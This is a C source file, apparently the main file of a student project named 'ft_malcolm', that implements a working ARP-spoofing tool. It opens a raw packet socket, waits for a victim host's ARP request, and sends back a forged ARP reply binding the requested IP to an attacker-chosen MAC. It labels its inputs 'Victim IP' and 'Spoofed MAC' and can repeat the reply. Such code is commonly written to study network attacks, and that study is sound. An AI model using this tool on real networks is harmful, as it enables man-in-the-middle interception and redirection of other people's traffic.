#include "ft_malcolm.h"
 

 t_lustructur g_struct = {0};
int g_socket = -1;

void ctrl_c(int sig) {
    if (g_struct.socket >= 0)
        close(g_struct.socket);
    printf("\n***************************\n* Program interrupted /!\\ *\n***************************\n");
    if (g_struct.verbose)
        printf("Received: \e[32m%d\e[0m | Sended: \e[32m%d\e[0m\n", g_struct.received, g_struct.sended);
    exit(sig);
}

int mymac(unsigned char* mac_addr, int if_index)
{
    struct ifaddrs *ifap;
    struct ifaddrs *ifaptr;

    if (!getifaddrs(&ifap))
    {
        ifaptr = ifap;
        while (ifaptr)
        {
            struct sockaddr_ll *s = (struct sockaddr_ll*)ifaptr->ifa_addr;
            if (s->sll_ifindex == if_index)
            {
                ft_memcpy(mac_addr, s->sll_addr, ETH_ALEN);
                break;
            }
            ifaptr = ifaptr->ifa_next;
        }
    }
    else
        return 1;
    freeifaddrs(ifap);
    return 0;
}


void macdcode(char *source, unsigned char *dest)
{
    int j;
    j = 0;
    for (int i = 0; i < ETH_ALEN; i++)
    {
        // printf("from %c%c to ", source[j],source[j+1]);
        // ac = 172
        // 172 = 16 * (97 - x) + (99 - x)
        // 172 = 1552 - 16x + 99 - x
        // 172 = 1651 - 17x
        // 1479 = 17x
        // x = 87
        dest[i] = 16 * (source[j] >= 'a' ? source[j] - 87 : source[j] - 48) + (source[j + 1] >= 'a' ? source[j + 1] - 87 : source[j + 1] - 48);
        // printf(" %d \n", dest[i]);
        j += 3;
    }
}
int spoof(char **av, struct ethhdr *eth_hdr, struct ether_arp *eth_arp, int if_index)
{

    if (mymac(eth_hdr->h_source, if_index))
    {
        printf("ft_malcolm: Error while getting own mac...\n");
        return 1;
    }
    eth_arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    macdcode(av[4], eth_hdr->h_dest);
    macdcode(av[2], eth_arp->arp_sha);
    macdcode(av[4], eth_arp->arp_tha);
    *(unsigned int *)eth_arp->arp_spa = inet_addr(g_struct.ip_host);
    *(unsigned int *)eth_arp->arp_tpa = inet_addr(g_struct.ip_target);

    return 0;
}

int arp_spoof(char **av)
{
    char buffer[2048] = {0};
    char saved[2048] = {0};
    struct sockaddr_ll addrcv = {0};
    socklen_t len = sizeof(addrcv);
    struct ether_arp *eth_arp;
    struct ethhdr *eth_hdr;

    while (1)
    {
        struct timeval start;
        while (1)
        {
            recvfrom(g_struct.socket, buffer, 2048, 0, (struct sockaddr *)&addrcv, &len);
            gettimeofday(&start, NULL);
            eth_hdr = (struct ethhdr *)buffer;
            eth_arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));
            if (ntohs(eth_hdr->h_proto) == ETH_P_ARP && ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REQUEST && *(unsigned int *)eth_arp->arp_tpa == inet_addr(g_struct.ip_host) && *(unsigned int *)eth_arp->arp_spa == inet_addr(g_struct.ip_target))
                break;
        }
        g_struct.received++;
        if (!saved[0])
        {
            printf("\e[32m%s \e[0m[\e[32m%s\e[0m]\e[0m send broadcast to find \e[33m%s\n\e[0m", av[3], av[4], av[1]);
            if (g_struct.verbose)
                printf("Creating a hijacked packet to spoof %s's MAC to [%s]\n", av[1], av[2]);

            if (spoof(av, eth_hdr, eth_arp, addrcv.sll_ifindex))
                return 1;
            if (g_struct.verbose)
                printf("Hijacked packet created, saving it...");
            ft_memcpy(saved, buffer, 1000);
            if (g_struct.verbose)
                printf("\e[32m DONE ! \e[0m\n");
        }
        if(sendto(g_struct.socket, saved, sizeof(struct ethhdr) + sizeof(struct ether_arp), 0, (struct sockaddr *)&addrcv, sizeof(struct sockaddr_ll)) == -1)
        {
            printf("ft_malcolm: Error while sending hijacked packet\n");
            return 1;
        }
        g_struct.sended++;
        struct timeval actual;
        gettimeofday(&actual, NULL);
        double time = (double)(actual.tv_usec - start.tv_usec) / 1000 + (double)(actual.tv_sec - start.tv_sec) * 1000;
        printf("Reply to \e[32m%s\e[0m [\e[32m%s\e[0m] with spoofed MAC [\e[33m%s\e[0m] as \e[33m%s\e[0m (%.3fms)\n", av[3], av[4], av[2], av[1], time > 2 ? time - 2 : time);
        if (g_struct.unique)
            return 0;
    }
}

int main(int ac, char **av)
{
    signal(SIGINT, ctrl_c);

    g_struct.socket = -1;

    if (check_error(ac, av, &g_struct))
        return 1;

    printf("Verbose mode: %s\e[0m\n", !g_struct.verbose ? "\e[31mOFF" : "\e[32mON");
    printf("Unique mode: %s\e[0m\n", !g_struct.unique ? "\e[31mOFF" : "\e[32mON");


    if ((g_struct.socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        printf("ft_malcolm: Error while opening socket...");
        exit (1);
    }
    if (g_struct.verbose)
        printf("Victim IP: %s\nVictim MAC: %s\nHost IP: %s\nSpoofed MAC: %s\n", g_struct.ip_target, av[4], g_struct.ip_host, av[2]);
    printf("Listening on ARP Broadcast...\n");

    int r_value;

    r_value = arp_spoof(av);

    if (g_struct.verbose)
        printf("Received: \e[32m%d\e[0m | Sended: \e[32m%d\e[0m\n", g_struct.received, g_struct.sended);

    if (g_struct.socket >= 0)
        close(g_struct.socket);
    return r_value;
}

